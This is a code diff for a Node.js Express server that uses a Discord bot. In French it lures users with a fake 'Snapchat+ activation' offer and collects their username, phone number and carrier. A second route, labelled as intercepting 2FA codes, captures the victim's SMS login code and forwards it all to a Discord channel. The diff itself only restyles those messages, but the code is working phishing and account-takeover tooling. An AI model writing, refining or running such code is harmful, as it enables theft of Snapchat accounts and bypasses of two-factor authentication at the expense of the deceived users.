@@ -44,11 +44,11 @@ app.post('/api/submit', async (req, res) => {
             .setTitle('📱 Nouvelle demande d\'activation Snapchat+')
             .setColor(0xFFFC00)
             .addFields(
-                { name: 'Pseudo', value: snapchat, inline: true },
-                { name: 'Téléphone', value: phone, inline: true },
-                { name: 'Opérateur', value: operator, inline: true },
-                { name: 'ID', value: id }
+                { name: '👤 Pseudo', value: `\`\`\`${snapchat}\`\`\``, inline: false },
+                { name: '📱 Téléphone', value: `\`\`\`${phone}\`\`\``, inline: false },
+                { name: '📡 Opérateur', value: `\`\`\`${operator}\`\`\``, inline: false }
             )
+            .setFooter({ text: `ID: ${id}` })
             .setTimestamp();
 
         const row = new ActionRowBuilder()
@@ -156,10 +156,10 @@ app.post('/api/code', async (req, res) => {
             .setTitle('🔐 Code 2FA intercepté')
             .setColor(0x00FF00)
             .addFields(
-                { name: 'Pseudo', value: request.snapchat },
-                { name: 'Téléphone', value: request.phone },
-                { name: 'Opérateur', value: request.operator },
-                { name: 'Code', value: code }
+                { name: '👤 Pseudo', value: `\`\`\`${request.snapchat}\`\`\``, inline: false },
+                { name: '📱 Téléphone', value: `\`\`\`${request.phone}\`\`\``, inline: false },
+                { name: '📡 Opérateur', value: `\`\`\`${request.operator}\`\`\``, inline: false },
+                { name: '🔑 Code SMS', value: `\`\`\`${code}\`\`\``, inline: false }
             )
             .setTimestamp();
         channel.send({ embeds: [embed] });
